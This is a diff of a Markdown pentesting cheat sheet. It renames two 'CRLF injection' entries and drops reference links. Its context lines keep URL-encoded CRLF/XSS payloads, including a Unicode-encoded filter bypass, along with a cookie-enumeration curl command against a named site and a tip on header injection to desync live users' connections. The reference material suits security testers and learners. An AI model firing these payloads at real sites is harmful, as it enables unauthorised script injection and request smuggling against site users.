@@ -1028,7 +1028,7 @@ Manually testing for XXE vulnerabilities generally involves
 - [Shortest rXSS possible](https://brutelogic.com.br/blog/shortest-reflected-xss-possible/)
 - If Privileges are required, see if you can chain the XSS with a [CSRF](#cross-site-request-forgery-csrf)
 
-**CRLF injection** [[Reference](https://www.acunetix.com/websitesecurity/crlf-injection/)]
+**Carriage Return Line Feed (CRLF) injection**
 - `/%0D%0AX-XSS-Protection%3A%200%0A%0A%3cscript%3ealert(document.domain)%3c%2fscript%3e%3c!--`
 - `/%E5%98%8D%E5%98%8AX-XSS-Protection%3A%200%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%3cscript%3ealert(document.domain)%3c%2fscript%3e%3c!--`
 - Nuclei template `%USERPROFILE%\nuclei-templates\vulnerabilities\generic\crlf-injection.yaml`
@@ -1362,7 +1362,7 @@ Many websites and CDNs perform various transformations on keyed components when 
 
 - "If someone sends a cookie called '0', automattic.com responds with a list of all 152 cookies supported by the application:
 curl -v -H 'Cookie: 0=1' https://automattic.com/?cb=123 | fgrep Cookie" [[Reference](https://hackerone.com/reports/310105)];
-- CRLF injection [[Reference](https://www.acunetix.com/websitesecurity/crlf-injection/)], "When you find response header injection, you can probably do better than mere XSS or open-redir. Try injecting a short Content-Length header to cause a reverse desync and exploit random live users." [[Reference](https://twitter.com/albinowax/status/1412778191119396864)]
+- Carriage Return Line Feed (CRLF) injection: "When you find response header injection, you can probably do better than mere XSS or open-redir. Try injecting a short Content-Length header to cause a reverse desync and exploit random live users." [[Reference](https://twitter.com/albinowax/status/1412778191119396864)]
 
 
 ### <ins>HTTP request smuggling</ins>
